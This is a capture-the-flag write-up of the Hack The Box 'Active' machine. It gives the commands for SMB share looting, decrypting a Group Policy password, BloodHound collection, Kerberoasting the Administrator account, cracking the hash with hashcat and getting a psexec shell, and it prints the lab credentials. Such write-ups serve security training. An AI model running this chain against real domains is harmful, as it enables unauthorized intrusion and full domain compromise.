---
icon: windows
---

# Active - Easy

<figure><img src="../../.gitbook/assets/image (1790).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/active"><strong>Active</strong></a></p></figcaption></figure>

## <mark style="color:blue;">**Gaining Access**</mark>

Nmap scan:

```
#Nmap TCP
$ nmap -A -T4 -p- -Pn 10.10.10.100 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 12:59 EDT
Nmap scan report for active.htb (10.10.10.100)
Host is up (0.055s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-15 17:00:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49173/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows                                   
                                                                                                                                                  
Host script results:                                                                                                                              
| smb2-time:                                                                                                                                      
|   date: 2025-09-15T17:01:30                                                                                                                     
|_  start_date: 2025-09-15T16:47:40                                                                                                               
| smb2-security-mode:                                                                                                                             
|   2:1:0:                                                                                                                                        
|_    Message signing enabled and required                                                                                                        
                                                                                                                                                  
TRACEROUTE (using port 1720/tcp)                                                                                                                  
HOP RTT      ADDRESS                                                                                                                              
1   28.80 ms 10.10.16.1                                                                                                                           
2   72.46 ms active.htb (10.10.10.100)                                                                                                                                                                                                                                                          
```

### <mark style="color:$primary;">DNS Enumeration</mark>

The ldap scan shows the domain name of active.htb. I'll add it to my /etc/hosts/ file

```
10.10.10.100	active.htbe
```

I'll try and brute force subdomains using dnsenum to see if anything else shows up.

```
dnsenum --dnsserver 10.10.10.100 -f ~/tools/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt active.htb
```

<figure><img src="../../.gitbook/assets/image (1776).png" alt=""><figcaption></figcaption></figure>

Thanks to this we know that his machine is also the DC (Domain Controller) let's add it to our /etc/hosts file

```
10.10.10.100	active.htb dc.active.htb
```

### <mark style="color:$primary;">SMB Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (1777).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1778).png" alt=""><figcaption></figcaption></figure>

Smbclient reveals a share containing Policies we can access anonymously. Let's download everything and take a look at it on our machine.

```
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
```

Let's run <mark style="background-color:$primary;">**ls -Ra**</mark> on the share so we can get a high level overview

<figure><img src="../../.gitbook/assets/image (1779).png" alt=""><figcaption></figcaption></figure>

Reveals an interesting file, let's check it out

<figure><img src="../../.gitbook/assets/image (1780).png" alt=""><figcaption></figcaption></figure>

The policy reveals the <mark style="color:yellow;">**GPP (group policy password)**</mark> of the svc\_tgs user. Let's decrypt it

### <mark style="color:$primary;">**Decrypting GPP Password**</mark>

```
$ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
GPPstillStandingStrong2k18
```

Now that we have some credentials, let's use netexec to do bloodhound collection

### <mark style="color:$primary;">Bloodhound</mark>

```
netexec ldap 10.10.10.100 -u svc_tgs -p 'GPPstillStandingStrong2k18' --bloodhound --collection All --dns-server 10.10.10.100
```

<figure><img src="../../.gitbook/assets/image (1781).png" alt=""><figcaption></figcaption></figure>

I will start bloodhound

```
sudo neo4j start
bloodhound
```

<figure><img src="../../.gitbook/assets/image (1787).png" alt=""><figcaption></figcaption></figure>

#### List all Kerberoastable Accounts

<figure><img src="../../.gitbook/assets/image (1782).png" alt=""><figcaption></figcaption></figure>

Administrator is Kerberoastable, let's grab his hash

### <mark style="color:$primary;">Kerberoasting</mark>

```
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```

<figure><img src="../../.gitbook/assets/image (1783).png" alt=""><figcaption></figcaption></figure>

Now we can crack it using hashcat

```
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt
```

```
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --show
```

<figure><img src="../../.gitbook/assets/image (1784).png" alt=""><figcaption></figcaption></figure>

Now we have the administrator's password

<figure><img src="../../.gitbook/assets/image (1785).png" alt=""><figcaption></figcaption></figure>

With read, write access on the shares we can psexec into the machine

```
rlwrap impacket-psexec active.htb/administrator:Ticketmaster1968@10.10.10.100
```

<figure><img src="../../.gitbook/assets/image (1786).png" alt=""><figcaption></figcaption></figure>
